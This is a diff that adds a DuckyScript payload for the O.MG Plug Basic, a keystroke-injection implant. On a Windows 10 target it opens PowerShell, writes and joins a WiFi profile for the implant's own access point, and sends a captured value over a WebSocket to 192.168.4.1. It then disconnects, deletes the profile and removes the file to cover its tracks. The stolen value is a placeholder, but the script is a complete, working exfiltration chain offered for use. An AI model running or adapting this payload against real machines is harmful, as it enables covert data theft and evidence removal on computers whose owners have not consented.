@@ -1,0 +1,101 @@
+REM --------------------------------------------------------------------
+REM Title: O.MG Plug Basic Local Exfiltrator
+REM Description: Exfiltrates via O.MG WebSocket API
+REM Author: thisismyrobot
+REM Target: Windows 10 (PowerShell)
+REM Version: 1.0
+REM Category: Exfiltration
+REM
+REM Local exfiltration for O.MG Plug Basic
+REM
+REM The Basic version of the Plug cannot do stuff like sharing a local
+REM storage device (at least at the time of writing), so this code
+REM does local exfil by connecting the target to the O.MG Plug's own
+REM WiFi and using WebSockets to save data to a setting.
+REM
+REM This assumes a WiFi-enabled target of course.
+REM
+REM Retrieve the data by using the CTList custom command under Debug.
+REM
+REM Designed to work with an O.MG Plug Basic with firmware v2.5-220322.
+REM --------------------------------------------------------------------
+
+DEFAULT_DELAY 500
+
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING cd c:\temp
+ENTER
+
+REM -----------------------
+REM Collect info to exfil.
+REM -----------------------
+
+STRING $e = "Secret password"
+ENTER
+
+REM ----------------------------------
+REM Connect to the O.MG AP.
+REM ----------------------------------
+
+STRING echo '<?xml version="1.0"?><WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"><name>O.MG</name><SSIDConfig><SSID><name>O.MG</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>12345678</keyMaterial></sharedKey></security></MSM></WLANProfile>' > profile.xml
+ENTER
+
+STRING netsh wlan add profile "profile.xml"
+ENTER
+
+STRING netsh wlan connect name=O.MG
+ENTER
+
+REM --------------------------------
+REM Establish websocket connection.
+REM --------------------------------
+
+STRING $ws = New-Object Net.WebSockets.ClientWebSocket
+ENTER
+
+STRING $ct = New-Object Threading.CancellationToken($false)
+ENTER
+
+STRING $connectTask = $ws.ConnectAsync("ws://192.168.4.1/d/ws/issue", $ct)
+ENTER
+
+STRING do { Sleep(0.1) } until ($connectTask.IsCompleted)
+ENTER
+
+REM --------
+REM Upload.
+REM --------
+
+STRING $ct = New-Object Threading.CancellationToken($false)
+ENTER
+
+STRING $command = "[custom]CTSet`tcaptured`t$e"
+ENTER
+
+STRING [ArraySegment[byte]]$msg = [Text.Encoding]::Utf8.GetBytes($command)
+ENTER
+
+STRING $ws.SendAsync($msg, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $ct).GetAwaiter().GetResult()
+ENTER
+
+DELAY 1000
+
+REM ----------
+REM Clean up.
+REM ----------
+
+STRING netsh wlan disconnect
+ENTER
+
+STRING netsh wlan delete profile name="O.MG"
+ENTER
+
+STRING del .\profile.xml
+ENTER
+
+STRING exit
+ENTER
